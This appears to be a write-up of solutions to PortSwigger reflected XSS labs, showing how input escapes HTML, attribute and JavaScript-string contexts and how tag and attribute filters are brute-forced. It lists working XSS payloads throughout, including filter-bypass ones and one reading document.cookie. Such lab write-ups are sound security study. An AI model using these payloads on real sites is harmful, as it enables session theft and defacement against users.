# Portswigger Labs Solution

## Reflected XSS into HTML context with nothing encoded

<div data-full-width="true"><figure><img src="../../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption><p><em>payload is reflected in the <mark style="color:red;">&#x3C;h1></mark> tag</em></p></figcaption></figure></div>

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption><p><em>context successfully escaped using <code>'></code></em></p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption><p>payload: <code>&#x3C;img/src=x onerror=alert();//</code></p></figcaption></figure>

## Reflected XSS into attribute with angle brackets HTML-encoded

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption><p><em>note that the payload is reflected at two places as seen in next pic.</em> </p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_So this time, we can craft the payload to trigger XSS in both the `<h1>` tag and the input field, since the payload is reflected in both locations._
{% endhint %}

### Trying to trigger XSS by escaping \`\<h1>\` tag

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption><p><em>Angle brackets are HTML-encoded, so we can't escape the context.</em></p></figcaption></figure>

### Trying to trigger XSS by escaping the \`\<input>\` tag context

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption><p><em>payload: <code>" onmouseover=alert(1);//</code></em></p></figcaption></figure>

Thus, we successfully triggered XSS inside the input tag using an event handler.

## Reflected XSS into a JavaScript string with angle brackets HTML encoded

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption><p><em>The payload is reflected in three different locations, as shown in the image below.</em></p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
First Reflection: Inside the <h1> tag

Second Reflection: In the searchTerms variable within the <script> tag

Third Reflection: Inside the <img> tag, as shown in the first image

Note:
The reflection inside the <img> tag isn't visible in the page source. It's visible only in the Elements/Inspector tab because the searchTerms variable is passed to document.write() in the script. As the browser executes the JavaScript, it dynamically injects the payload into the DOM, making it visible in the inspector.

Thus we've three injection points. 
```
{% endcode %}

### Trying to escape context for triggering XSS in \`\<h1>\`

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption><p><em>Since angle brackets are HTML encoded we can't  trigger XSS in H1.</em> </p></figcaption></figure>

### Trying to trigger XSS by escaping \`searchTerms\`  variable

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption><p>payload used: <code>var_value'; alert();//</code></p></figcaption></figure>

### Trying to trigger XSS in \`\<img>\` tag

> _Since both angle brackets and quotes are HTML-encoded, we can't escape the `<img>` tag context._

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

### Reflected XSS into HTML context with most tags and attributes blocked

<mark style="color:red;">**Level: Intermediate (WAF in action)**</mark>

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption><p><em>only 1 reflection in the <code>&#x3C;h1></code> tab.</em> </p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption><p><em>tags are blocked. oh no.</em> </p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption><p><em>custom tags seems to be worked as in the below pic.</em> </p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption><p><em>Custom tag went through, but the attribute ruined the game. payload used: </em><kbd><em>&#x3C;hola onmouseover=alert()>here&#x3C;/hola></em></kbd></p></figcaption></figure>

{% hint style="info" %}
_Whenever we get errors like 'Attribute is not allowed' or 'Tag is not allowed', the response status code is 400._
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

_We've found some attributes that might work, but our custom tag isn't getting through—so we need to brute-force again to find which tag is allowed._

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Now that we know which tag works, let’s use it.

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption><p><kbd><em>&#x3C;body onresize=alert()>hola</em></kbd><br><em>other working payload: </em><kbd><em>`'&#x3C;body/onresize=alert();//`</em></kbd></p></figcaption></figure>

## Reflected XSS into HTML context with all tags blocked except custom ones

<mark style="color:red;">**Level: Intermediate (WAF in action)**</mark>

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption><p><em>reflection only in `&#x3C;h1>` tag.</em> </p></figcaption></figure>

Tags are blocked.&#x20;

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption><p><em>payload: <code>&#x3C;hola onmouseover=alert()>here&#x3C;/hola></code></em></p></figcaption></figure>

If filtering is based on opening and closing tags, use a payload like `` ` <hola onmouseover=alert(1);// `` to bypass it. Make sure to know where to mouse over, as it's possible you might be hovering over something else and the XSS won't trigger.&#x20;

{% hint style="info" %}
Other good event handler: `onfocus` But you need to call it as:&#x20;

`<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';`
{% endhint %}

